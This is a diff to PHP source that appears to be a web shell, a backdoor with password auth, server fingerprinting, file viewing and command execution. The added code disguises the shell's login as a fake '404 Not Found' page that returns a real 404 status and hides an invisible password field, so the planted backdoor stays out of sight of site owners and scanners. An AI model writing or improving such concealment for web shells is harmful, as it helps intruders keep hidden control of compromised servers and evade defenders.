@@ -25,22 +25,26 @@ if(!function_exists('auth')){
 			}
 
 			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
+				header("HTTP/1.1 404 Not Found");
 				$res = "<!doctype html>
-		<html>
-		<head>
-		<meta charset='utf-8'>
-		<meta name='robots' content='noindex, nofollow, noarchive'>
-		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
-		</head>
-		<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
-		<script type='text/javascript'>
-		var d = document;
-		d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
-		d.getElementById('pass').focus();
-		d.getElementById('pass').setAttribute('autocomplete', 'off');
-		</script>
-		</body></html>
-		";
+						<html>
+						<head>
+						<title>404 Not Found</title>
+						<meta charset='utf-8'>
+						<meta name='robots' content='noindex, nofollow, noarchive'>
+						</head>
+						<body>
+						<h1>Not Found</h1>
+						<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>
+						<hr>
+						<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."
+						<script type='text/javascript'>
+						var d = document;
+						d.write(\"<form method='post'><center><input type='password' id='pass' name='pass' style='border:0px;cursor:default;'></center></form>\");
+						</script>
+						</address>
+						</body>
+						</html>";
 				echo $res;
 				die();
 			}
@@ -55,7 +59,7 @@ if(!function_exists('get_server_info')){
 		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
 		$server_info['uname'] = php_uname();
 		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
-		$server_info['software'] = $server_software."  PHP ".phpversion();		
+		$server_info['software'] = $server_software."  PHP ".phpversion();
 		return $server_info;
 	}
 }
@@ -529,8 +533,8 @@ if(!function_exists('view_file')){
 							"hl_html"=> ini_get('highlight.html'),
 							"hl_comment"=> ini_get('highlight.comment')
 							);
-				
-				
+
+
 				$content = highlight_string(read_file($file),true);
 				foreach($hl_arr as $k=>$v){
 					$content = str_replace("<font color=\"".$v."\">", "<font class='".$k."'>", $content);
@@ -766,7 +770,7 @@ if(!function_exists('show_all_files')){
 if(!function_exists('eval_get_supported')){
 	function eval_get_supported(){
 		$eval_supported = array();
-		
+
 		$eval_supported[] = "php";
 
 		$check = strtolower(execute("python -h"));
